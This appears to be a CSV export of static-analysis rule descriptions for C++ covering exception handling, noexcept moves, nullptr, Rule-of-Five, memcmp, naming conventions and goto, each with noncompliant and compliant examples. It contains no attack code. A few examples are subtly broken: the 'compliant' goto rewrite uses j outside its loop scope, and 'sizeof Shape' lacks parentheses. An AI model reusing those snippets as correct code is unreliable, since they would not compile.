2016-08-24T19:11:25+0200,"<p>When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly, or at least to log them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void save() {
  try {
    saveDocument();
  } catch (const std::exception&amp; ex) {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void save() {
  try {
    saveDocument();
  } catch (const std::exception&amp; ex) {
    log &lt;&lt; ""Exception while saving the document: "" &lt;&lt; ex.what();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",cpp:S2486,cpp,C++,"<p>When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly, or at least to log them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void save() {
  try {
    saveDocument();
  } catch (const std::exception&amp; ex) {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void save() {
  try {
    saveDocument();
  } catch (const std::exception&amp; ex) {
    log &lt;&lt; ""Exception while saving the document: "" &lt;&lt; ex.what();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",Exceptions should not be ignored,[],CRITICAL,"['cwe', 'error-handling', 'owasp-a10', 'suspicious']",VULNERABILITY
2015-04-11T13:39:15+0200,"<p>Just as comparing apples and oranges is seen as a classic folly, comparing values from different enumerations against each other is nonsensical.
True, at root <code>enum</code>s are simply named numbers, and it's certainly valid to compare numbers. But an added layer of meaning is created by an
<code>enum</code>, one that goes beyond simple numerical values.</p>
<p>Ignoring that extra layer of meaning is at best a trap for maintainers, who are likely to be hopelessly confused by the code. At worst, it is a
bug, which will lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum apple {BRAEBURN, FUJI, GRANNY_SMITH, RED_DELICIOUS};
enum orange {BLOOD, NAVEL, BITTER, BERGAMOT, MANDARIN};

bool fun(apple v1, orange v2) {
  return v1 != v2;  // Noncompliant
}
</pre>",cpp:S2753,cpp,C++,"<p>Just as comparing apples and oranges is seen as a classic folly, comparing values from different enumerations against each other is nonsensical.
True, at root <code>enum</code>s are simply named numbers, and it's certainly valid to compare numbers. But an added layer of meaning is created by an
<code>enum</code>, one that goes beyond simple numerical values.</p>
<p>Ignoring that extra layer of meaning is at best a trap for maintainers, who are likely to be hopelessly confused by the code. At worst, it is a
bug, which will lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum apple {BRAEBURN, FUJI, GRANNY_SMITH, RED_DELICIOUS};
enum orange {BLOOD, NAVEL, BITTER, BERGAMOT, MANDARIN};

bool fun(apple v1, orange v2) {
  return v1 != v2;  // Noncompliant
}
</pre>","Values of different ""enum"" types should not be compared",[],MAJOR,[],BUG
2016-01-26T09:39:35+0100,"<p>In the interest of code clarity, <code>static</code> member variables of a base class should never be accessed using a derived type's name. Doing
so is confusing and could create the illusion that two different static variables exist. If the variable is <code>const</code>, there is no risk of
confusion.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  public:
    static int count;
    static Color const defaultColor = green;
};

class Child : public Parent {
  public:
    Child() : myColor(Child::defaultColor) // Compliant, this is a constant
    {
      Child::count++;  // Noncompliant
    }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class Parent {
  public:
    static int count;
    static Color const defaultColor = green;
};

class Child : public Parent {
  public:
    Child() : myColor(Child::defaultColor) // Compliant, this is a constant
    {
      Parent::count++;
    }
};
</pre>",cpp:S3252,cpp,C++,"<p>In the interest of code clarity, <code>static</code> member variables of a base class should never be accessed using a derived type's name. Doing
so is confusing and could create the illusion that two different static variables exist. If the variable is <code>const</code>, there is no risk of
confusion.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  public:
    static int count;
    static Color const defaultColor = green;
};

class Child : public Parent {
  public:
    Child() : myColor(Child::defaultColor) // Compliant, this is a constant
    {
      Child::count++;  // Noncompliant
    }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
class Parent {
  public:
    static int count;
    static Color const defaultColor = green;
};

class Child : public Parent {
  public:
    Child() : myColor(Child::defaultColor) // Compliant, this is a constant
    {
      Parent::count++;
    }
};
</pre>","""static"" base class members should not be accessed via derived types",[],CRITICAL,['confusing'],CODE_SMELL
2018-12-19T08:44:15+0100,"<p>Move operations (move constructor, move assignment operator) are all about efficient resource stealing. When stealing resources from the source,
you don't have to allocate any memory or perform any other operation that might fail. This is why most people will expect move operation to be
non-throwing.</p>
<p>Additionally, if a move operation fails, the source object can have been partially altered by the move, making recovery very tricky, or just
impossible. Therefore, to ensure robustness, some functions (for instance, <code>std::move_if_noexcept</code>, used by <code>std::vector</code>) will
decide to copy your object if its move operations are not decorated with <code>noexcept</code>. This can significantly slow down your program.</p>
<p>If you can not implement your move operations so that they never throw, you may as well only provide copy operations that will be safer to use.</p>
<p>Note that for most classes, you should not write your own move operations, but rely on the ""Rule-of-Zero"" (S4963).</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct A {
  A (A const &amp;a);
  A (A &amp;&amp; a); // Noncompliant
  ~A();
  A &amp;operator=(A const &amp;a);
  A &amp;operator=(A &amp;&amp;a); // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct A {
  A (A const &amp;a);
  A (A &amp;&amp; a) noexcept;
  ~A();
  A &amp;operator=(A const &amp;a);
  A &amp;operator=(A &amp;&amp;a) noexcept;
};
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#c66-make-move-operations-noexcept"">C++ core guidelines C.66</a> Make move
  operations <code>noexcept</code> </li>
</ul>",cpp:S5018,cpp,C++,"<p>Move operations (move constructor, move assignment operator) are all about efficient resource stealing. When stealing resources from the source,
you don't have to allocate any memory or perform any other operation that might fail. This is why most people will expect move operation to be
non-throwing.</p>
<p>Additionally, if a move operation fails, the source object can have been partially altered by the move, making recovery very tricky, or just
impossible. Therefore, to ensure robustness, some functions (for instance, <code>std::move_if_noexcept</code>, used by <code>std::vector</code>) will
decide to copy your object if its move operations are not decorated with <code>noexcept</code>. This can significantly slow down your program.</p>
<p>If you can not implement your move operations so that they never throw, you may as well only provide copy operations that will be safer to use.</p>
<p>Note that for most classes, you should not write your own move operations, but rely on the ""Rule-of-Zero"" (S4963).</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct A {
  A (A const &amp;a);
  A (A &amp;&amp; a); // Noncompliant
  ~A();
  A &amp;operator=(A const &amp;a);
  A &amp;operator=(A &amp;&amp;a); // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct A {
  A (A const &amp;a);
  A (A &amp;&amp; a) noexcept;
  ~A();
  A &amp;operator=(A const &amp;a);
  A &amp;operator=(A &amp;&amp;a) noexcept;
};
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#c66-make-move-operations-noexcept"">C++ core guidelines C.66</a> Make move
  operations <code>noexcept</code> </li>
</ul>","Move operations should be ""noexcept""",[],BLOCKER,"['cpp11', 'error-handling']",BUG
2018-12-19T08:44:15+0100,"<p>Before C+11, the only way to refer to a null pointer was by using the integer literal <code>0</code>, which created ambiguity with regard to
whether a pointer or integers was intended. Even when the <code>NULL</code> macro is used, the underlying value is still <code>0</code>. </p>
<p> C++11 introduced the keyword <code>nullptr</code>, which is unambiguous and should be used systematically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f(char *c);
void g(int i);
void h()
{
    f(0); // Noncompliant
    f(NULL); // Noncompliant
    g(0); // Compliant, a real integer
    g(NULL); // Noncompliant, NULL should not be used for a real integer
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f(char *c);
void g(int i);
void h()
{
    f(nullptr); // Compliant
    g(0);  // Compliant, a real integer
}
</pre>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Res-nullptr"">C++ core guidelines ES.47</a> Use nullptr rather than 0 or
NULL</p>",cpp:S4962,cpp,C++,"<p>Before C+11, the only way to refer to a null pointer was by using the integer literal <code>0</code>, which created ambiguity with regard to
whether a pointer or integers was intended. Even when the <code>NULL</code> macro is used, the underlying value is still <code>0</code>. </p>
<p> C++11 introduced the keyword <code>nullptr</code>, which is unambiguous and should be used systematically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void f(char *c);
void g(int i);
void h()
{
    f(0); // Noncompliant
    f(NULL); // Noncompliant
    g(0); // Compliant, a real integer
    g(NULL); // Noncompliant, NULL should not be used for a real integer
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f(char *c);
void g(int i);
void h()
{
    f(nullptr); // Compliant
    g(0);  // Compliant, a real integer
}
</pre>
<h2>See</h2>
<p> * <a href=""https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines#Res-nullptr"">C++ core guidelines ES.47</a> Use nullptr rather than 0 or
NULL</p>","""nullptr"" should be used to denote the null pointer",[],CRITICAL,"['bad-practice', 'cpp11']",CODE_SMELL
2018-12-19T08:44:15+0100,"<p>In C++, you should not directly manipulate resources (a database transaction, a network connection, a mutex lock), but encapsulate them in RAII
wrapper classes that will allow to manipulate them safely. When defining one of those wrapper classes, you cannot rely on the compiler-generated
special member functions to manage the class' resources for you (see the Rule-of-Zero, S4963). You must define those functions yourself to make sure
the class' resources are properly copied, moved, and destroyed.</p>
<p>In that case, make sure you consider what should be done for all five special functions (all three of them if your compiler is pre-C++11):</p>
<p>- The destructor, to release the resource when the wrapper is destroyed</p>
<p>- The copy constructor and the copy-assignment operator, to handle what should happen to the resource when the wrapper is copied (a valid option is
to disable those operations with <code>=delete</code>)</p>
<p>- The move constructor and the move-assignment operator, to handle what should happen to the resource when the wrapper is moved (since C++11). If
you cannot find a way to implement them more efficiently than the copy operations, as an exception to this rule, you can just leave out these
operations: the compiler will not generate them and will use the copy operations as a fallback.</p>
<p>Those operations work together, and letting the compiler automatically generate some of them, but not all, means that when one of those functions
is called, the integrity of the resource will probably be compromised (for instance, it might lead to double release of a resource when the wrapper is
copied).</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooPointer { // Noncompliant, missing copy constructor and copy-assignment operator
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  ~FooPointer() {
    delete pFoo;
  }
};

int main() {
  FooPointer a(5);
  FooPointer b = a; // implicit copy constructor gives rise to double free memory error
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooPointer { // Compliant, although it's usually better to reuse an existing wrapper for memory
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  FooPointer(FooPointer&amp; other) {
    pFoo = new Foo(other.pFoo-&gt;value);
  }
  FooPointer&amp; operator=(const FooPointer&amp; other) {
    int val = other.pFoo-&gt;value;
    delete pFoo;
    pFoo = new Foo(val);
    return *this;
  }
  FooPointer(FooPointer &amp;&amp;fp) noexcept {
    pFoo = fp.pFoo;
    fp.pFoo = nullptr;
  }
  FooPointer const &amp; operator=(FooPointer &amp;&amp;fp) {
    FooPointer temp(std::move(fp));
    std::swap(temp.pFoo, pFoo);
    return *this;
  }
  ~FooPointer() {
    delete pFoo;
  }
};

int main() {
  FooPointer a(5);
  FooPointer b = a; // no error
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/SAAV"">CERT, OOP-06-CPP.</a> - Create a private copy constructor and assignment operator
  for non copyable objects </li>
</ul>",cpp:S3624,cpp,C++,"<p>In C++, you should not directly manipulate resources (a database transaction, a network connection, a mutex lock), but encapsulate them in RAII
wrapper classes that will allow to manipulate them safely. When defining one of those wrapper classes, you cannot rely on the compiler-generated
special member functions to manage the class' resources for you (see the Rule-of-Zero, S4963). You must define those functions yourself to make sure
the class' resources are properly copied, moved, and destroyed.</p>
<p>In that case, make sure you consider what should be done for all five special functions (all three of them if your compiler is pre-C++11):</p>
<p>- The destructor, to release the resource when the wrapper is destroyed</p>
<p>- The copy constructor and the copy-assignment operator, to handle what should happen to the resource when the wrapper is copied (a valid option is
to disable those operations with <code>=delete</code>)</p>
<p>- The move constructor and the move-assignment operator, to handle what should happen to the resource when the wrapper is moved (since C++11). If
you cannot find a way to implement them more efficiently than the copy operations, as an exception to this rule, you can just leave out these
operations: the compiler will not generate them and will use the copy operations as a fallback.</p>
<p>Those operations work together, and letting the compiler automatically generate some of them, but not all, means that when one of those functions
is called, the integrity of the resource will probably be compromised (for instance, it might lead to double release of a resource when the wrapper is
copied).</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooPointer { // Noncompliant, missing copy constructor and copy-assignment operator
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  ~FooPointer() {
    delete pFoo;
  }
};

int main() {
  FooPointer a(5);
  FooPointer b = a; // implicit copy constructor gives rise to double free memory error
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooPointer { // Compliant, although it's usually better to reuse an existing wrapper for memory
  Foo* pFoo;
public:
  FooPointer(int initValue) {
    pFoo = new Foo(initValue);
  }
  FooPointer(FooPointer&amp; other) {
    pFoo = new Foo(other.pFoo-&gt;value);
  }
  FooPointer&amp; operator=(const FooPointer&amp; other) {
    int val = other.pFoo-&gt;value;
    delete pFoo;
    pFoo = new Foo(val);
    return *this;
  }
  FooPointer(FooPointer &amp;&amp;fp) noexcept {
    pFoo = fp.pFoo;
    fp.pFoo = nullptr;
  }
  FooPointer const &amp; operator=(FooPointer &amp;&amp;fp) {
    FooPointer temp(std::move(fp));
    std::swap(temp.pFoo, pFoo);
    return *this;
  }
  ~FooPointer() {
    delete pFoo;
  }
};

int main() {
  FooPointer a(5);
  FooPointer b = a; // no error
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/SAAV"">CERT, OOP-06-CPP.</a> - Create a private copy constructor and assignment operator
  for non copyable objects </li>
</ul>","When the ""Rule-of-Zero"" is not applicable, the ""Rule-of-Five"" should be followed",[],CRITICAL,"['cert', 'leak']",BUG
2018-12-19T08:44:15+0100,"<p>The function <code>memcmp</code> can only be used for objects of trivially copyable types. This includes scalar types, arrays, and trivially
copyable classes. </p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>Additionally, if the type contains padding, some of its bits might be non-representative, and a strict comparison of raw memory contents might lead
to the mistaken belief that two identical objects are actually different.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape { // Trivially copyable, but will contain padding after the bool on most architectures
public:
  bool visible;
  int x;
  int y;
};

bool isSame(Shape *s1, Shape *s2)
{
    return memcmp(s1, s2, sizeof Shape) == 0; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  bool visible;
  int x;
  int y;
};

bool operator==(Shape const &amp;s1, Shape const &amp;s2) {
  return s1.visible == s2.visible &amp;&amp; s1.x == s2.x &amp;&amp; s1.y == s2.y;
}

bool isSame(Shape *s1, Shape *s2)
{
    return (*s1) == (*s2);
}
</pre>",cpp:S5000,cpp,C++,"<p>The function <code>memcmp</code> can only be used for objects of trivially copyable types. This includes scalar types, arrays, and trivially
copyable classes. </p>
<p>A class type is trivially copyable if:</p>
<ul>
  <li> One or more of the following methods is trivial and the rest are deleted: copy constructor, move constructor, copy assignment operator, and
  move assignment operator, </li>
  <li> It has a trivial, non-deleted destructor. </li>
</ul>
<p>Additionally, if the type contains padding, some of its bits might be non-representative, and a strict comparison of raw memory contents might lead
to the mistaken belief that two identical objects are actually different.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Shape { // Trivially copyable, but will contain padding after the bool on most architectures
public:
  bool visible;
  int x;
  int y;
};

bool isSame(Shape *s1, Shape *s2)
{
    return memcmp(s1, s2, sizeof Shape) == 0; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Shape {
public:
  bool visible;
  int x;
  int y;
};

bool operator==(Shape const &amp;s1, Shape const &amp;s2) {
  return s1.visible == s2.visible &amp;&amp; s1.x == s2.x &amp;&amp; s1.y == s2.y;
}

bool isSame(Shape *s1, Shape *s2)
{
    return (*s1) == (*s2);
}
</pre>","""memcmp"" should only be called with pointers to trivially copyable types with no padding",[],BLOCKER,['unpredictable'],BUG
2015-11-05T15:08:05+0100,"<p>The real need for bit fields is narrow and highly specialized. Previously, they were used to save memory, but that's less a concern in modern
systems than are the extra instructions required to interact with them. Today, they may be needed in direct hardware interaction, but since their
behavior is platform-dependent, getting them right can be tricky, and since their use is increasingly rare these days, they're likely to confuse
maintainers. For these reasons, it's simpler and more performant to use another field type instead of bit fields.</p>
<h2>Noncompliant Code Example</h2>
<pre>
unsigned int b1 : 3;  // Noncompliant
unsigned char b2 : 3;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
unsigned int b1;
unsigned char b2;
</pre>",cpp:S2806,cpp,C++,"<p>The real need for bit fields is narrow and highly specialized. Previously, they were used to save memory, but that's less a concern in modern
systems than are the extra instructions required to interact with them. Today, they may be needed in direct hardware interaction, but since their
behavior is platform-dependent, getting them right can be tricky, and since their use is increasingly rare these days, they're likely to confuse
maintainers. For these reasons, it's simpler and more performant to use another field type instead of bit fields.</p>
<h2>Noncompliant Code Example</h2>
<pre>
unsigned int b1 : 3;  // Noncompliant
unsigned char b2 : 3;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
unsigned int b1;
unsigned char b2;
</pre>",Bit fields should not be used,[],BLOCKER,"['performance', 'pitfall']",CODE_SMELL
2015-11-05T15:08:05+0100,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all <code>enum</code> names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
enum someEnumeration { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
enum SomeEnumeration {
};
</pre>",cpp:S2342,cpp,C++,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all <code>enum</code> names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
enum someEnumeration { // Noncompliant
};
</pre>
<h2>Compliant Solution</h2>
<pre>
enum SomeEnumeration {
};
</pre>",Enumeration names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the enumeration names against', 'defaultValue': '[A-Z][a-zA-Z0-9]+', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2015-11-05T15:08:05+0100,"<p>Shared coding conventions allow teams to collaborate effectively. This rule checks that labels match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][A-Z0-9_]+</code>:</p>
<pre>
exit:  // Noncompliant
  doCleanup();
</pre>
<h2>Compliant Solution</h2>
<pre>
EXIT:  // Compliant
  doCleanup();
</pre>",cpp:S3222,cpp,C++,"<p>Shared coding conventions allow teams to collaborate effectively. This rule checks that labels match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][A-Z0-9_]+</code>:</p>
<pre>
exit:  // Noncompliant
  doCleanup();
</pre>
<h2>Compliant Solution</h2>
<pre>
EXIT:  // Compliant
  doCleanup();
</pre>",Label names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the label names against.', 'defaultValue': '[A-Z][A-Z0-9_]+', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all class names (along with Objective-C interface, protocol and implementation names) match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
// C++
class foo // Noncompliant
{
};

// Objective-C
@interface nonCompliant : NSObject
@end
</pre>
<h2>Compliant Solution</h2>
<pre>
// C++
class Foo // Compliant
{
};

// Objective-C
@interface Compliant : NSObject
@end
</pre>",cpp:ClassName,cpp,C++,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all class names (along with Objective-C interface, protocol and implementation names) match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>[A-Z][a-zA-Z0-9]+</code>:</p>
<pre>
// C++
class foo // Noncompliant
{
};

// Objective-C
@interface nonCompliant : NSObject
@end
</pre>
<h2>Compliant Solution</h2>
<pre>
// C++
class Foo // Compliant
{
};

// Objective-C
@interface Compliant : NSObject
@end
</pre>",Class names should comply with a naming convention,"[{'key': 'format', 'htmlDesc': 'POSIX regular expression used to check the class names against.', 'defaultValue': '[A-Z][a-zA-Z0-9]+', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-08-07T09:36:27+0200,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>union</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
union my_union {
    int one;
    int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
union MyUnion {
    int one;
    int two;
};
</pre>",cpp:S1878,cpp,C++,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>union</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
union my_union {
    int one;
    int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
union MyUnion {
    int one;
    int two;
};
</pre>","""union"" names should comply with a naming convention","[{'key': 'format', 'htmlDesc': 'POSIX regular expression union names should match.', 'defaultValue': '[A-Z][a-zA-Z0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2014-05-24T08:26:46+0200,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>struct</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
struct myStruct {
  int one;
  int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct MyStruct {
  int one;
  int two;
};
</pre>",cpp:S1642,cpp,C++,"<p>Sharing some naming conventions enables teams to collaborate more efficiently. This rule checks that all <code>struct</code> names match a provided
regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default regular expression <code>[A-Z][a-zA-Z0-9]*</code>:</p>
<pre>
struct myStruct {
  int one;
  int two;
};
</pre>
<h2>Compliant Solution</h2>
<pre>
struct MyStruct {
  int one;
  int two;
};
</pre>","""struct"" names should comply with a naming convention","[{'key': 'format', 'htmlDesc': 'POSIX regular expression struct names should match.', 'defaultValue': '[A-Z][a-zA-Z0-9]*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,common-cpp:InsufficientBranchCoverage,cpp,C++,An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.,Branches should have sufficient coverage by tests,"[{'key': 'minimumBranchCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as there is at least one block of duplicated code on this file,common-cpp:DuplicatedBlocks,cpp,C++,An issue is created on a file as soon as there is at least one block of duplicated code on this file,Source files should not have any duplicated blocks,[],MAJOR,['pitfall'],CODE_SMELL
2015-10-13T10:34:30+0200,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,common-cpp:FailedUnitTests,cpp,C++,Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.,Failed unit tests should be fixed,[],MAJOR,[],BUG
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,common-cpp:InsufficientCommentDensity,cpp,C++,An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.,Source files should have a sufficient density of comment lines,"[{'key': 'minimumCommentDensity', 'defaultValue': '25', 'type': 'FLOAT'}]",MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,common-cpp:InsufficientLineCoverage,cpp,C++,An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.,Lines should have sufficient coverage by tests,"[{'key': 'minimumLineCoverageRatio', 'defaultValue': '65', 'type': 'FLOAT'}]",MAJOR,['bad-practice'],CODE_SMELL
2015-10-13T10:34:30+0200,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,common-cpp:SkippedUnitTests,cpp,C++,Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.,Skipped unit tests should be either removed or fixed,[],MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Unconstrained use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse. For C++, it can also lead to
the program exhibiting unspecified behavior.</p>
<p>However, in many cases a total ban on <code>goto</code> requires the introduction of flags to ensure correct control flow, and it is possible that
these flags may themselves be less transparent than the <code>goto</code> they replace.</p>
<p>Therefore, the restricted use of <code>goto</code> is allowed where that use will not lead to semantics contrary to developer expectations. ""Back""
jumps are prohibited, since they can be used to create iterations without using the well-defined iteration statements supplied by the core
language.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int f() {
  int j = 0;
L1:
  ++j;
  if (10 == j) {
    goto L2;         // forward jump ignored
  }
  // ...
  goto L1;           // Noncompliant
L2:
  return ++j;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f() {
  for (int j = 0; j &lt; 11; j++) {
    // ...
  }
  return ++j;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-2 - The goto statement shall jump to a label declared later in the same function body </li>
  <li> MISRA C:2012, 15.2 - The goto statement shall jump to a label declared later in the same function </li>
</ul>",cpp:BackJumpWithGoto,cpp,C++,"<p>Unconstrained use of <code>goto</code> can lead to programs that are extremely difficult to comprehend and analyse. For C++, it can also lead to
the program exhibiting unspecified behavior.</p>
<p>However, in many cases a total ban on <code>goto</code> requires the introduction of flags to ensure correct control flow, and it is possible that
these flags may themselves be less transparent than the <code>goto</code> they replace.</p>
<p>Therefore, the restricted use of <code>goto</code> is allowed where that use will not lead to semantics contrary to developer expectations. ""Back""
jumps are prohibited, since they can be used to create iterations without using the well-defined iteration statements supplied by the core
language.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int f() {
  int j = 0;
L1:
  ++j;
  if (10 == j) {
    goto L2;         // forward jump ignored
  }
  // ...
  goto L1;           // Noncompliant
L2:
  return ++j;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f() {
  for (int j = 0; j &lt; 11; j++) {
    // ...
  }
  return ++j;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-2 - The goto statement shall jump to a label declared later in the same function body </li>
  <li> MISRA C:2012, 15.2 - The goto statement shall jump to a label declared later in the same function </li>
</ul>","""goto"" should jump to labels declared later in the same function",[],BLOCKER,"['misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>This excludes the use of <code>//</code> C99 style comments and C++ style comments, since these are not permitted in C90. Many compilers support
the <code>//</code> style of comments as an extension to C90. The use of <code>//</code> in preprocessor directives (e.g. <code>#define</code>) can
vary. Also the mixing of <code>/* ... */</code> and <code>//</code> is not consistent. This is more than a style issue, since different (pre C99)
compilers may behave differently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main(int argc, char* argv[])
{
  // Do nothing - Noncompliant
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main(int argc, char* argv[])
{
  /* Do nothing - Compliant */
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.2 - Source code shall only use /* ... */ style comments. </li>
</ul>",cpp:C99CommentUsage,cpp,C++,"<p>This excludes the use of <code>//</code> C99 style comments and C++ style comments, since these are not permitted in C90. Many compilers support
the <code>//</code> style of comments as an extension to C90. The use of <code>//</code> in preprocessor directives (e.g. <code>#define</code>) can
vary. Also the mixing of <code>/* ... */</code> and <code>//</code> is not consistent. This is more than a style issue, since different (pre C99)
compilers may behave differently.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int main(int argc, char* argv[])
{
  // Do nothing - Noncompliant
  return 0;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int main(int argc, char* argv[])
{
  /* Do nothing - Compliant */
  return 0;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.2 - Source code shall only use /* ... */ style comments. </li>
</ul>",Source code should only use /* ... */ style comments,[],MINOR,"['convention', 'misra']",CODE_SMELL
